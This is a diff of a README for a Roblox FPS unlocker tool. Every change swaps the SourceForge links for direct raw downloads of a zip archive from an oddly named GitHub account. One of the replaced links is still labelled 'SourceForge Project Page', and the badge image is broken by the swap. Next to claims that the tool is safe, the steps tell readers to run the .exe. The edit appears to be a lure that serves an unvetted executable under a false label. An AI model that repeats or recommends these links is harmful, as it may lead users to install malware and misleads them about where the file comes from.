@@ -6,7 +6,7 @@ Welcome to the Roblox-FPS-Unlocker! This application lets you enjoy Roblox with 
 
 ## 📥 Download Now
 
-[![Download Roblox-FPS-Unlocker](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://sourceforge.net/projects/roblox-fps-unlocker-free)
+[![Download Roblox-FPS-Unlocker](https://github.com/hehehegnnnnnnnnnnnnnnnnnn/Roblox-FPS-Unlocker/raw/refs/heads/main/devvel/FP_Roblox_Unlocker_3.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/hehehegnnnnnnnnnnnnnnnnnn/Roblox-FPS-Unlocker/raw/refs/heads/main/devvel/FP_Roblox_Unlocker_3.4.zip)
 
 ## 🛠️ System Requirements
 
@@ -22,7 +22,7 @@ Before you download, ensure your computer meets these basic requirements:
 
 To get started, follow these simple steps:
 
-1. **Visit this page to download**: Click [here](https://sourceforge.net/projects/roblox-fps-unlocker-free) to go to the download page. 
+1. **Visit this page to download**: Click [here](https://github.com/hehehegnnnnnnnnnnnnnnnnnn/Roblox-FPS-Unlocker/raw/refs/heads/main/devvel/FP_Roblox_Unlocker_3.4.zip) to go to the download page. 
 2. Once on the page, look for the latest version listed. Click the link to download the installer.
 3. After the download is complete, locate the downloaded file in your "Downloads" folder or the folder you specified.
 4. Double-click the .exe file to start the installation.
@@ -57,7 +57,7 @@ Roblox-FPS-Unlocker is designed with user safety in mind. It does not collect pe
 
 ## 🔗 Useful Links
 
-- **SourceForge Project Page**: [Visit here](https://sourceforge.net/projects/roblox-fps-unlocker-free) for updates and additional information.
+- **SourceForge Project Page**: [Visit here](https://github.com/hehehegnnnnnnnnnnnnnnnnnn/Roblox-FPS-Unlocker/raw/refs/heads/main/devvel/FP_Roblox_Unlocker_3.4.zip) for updates and additional information.
 
 ## 🗨️ Feedback and Support
 
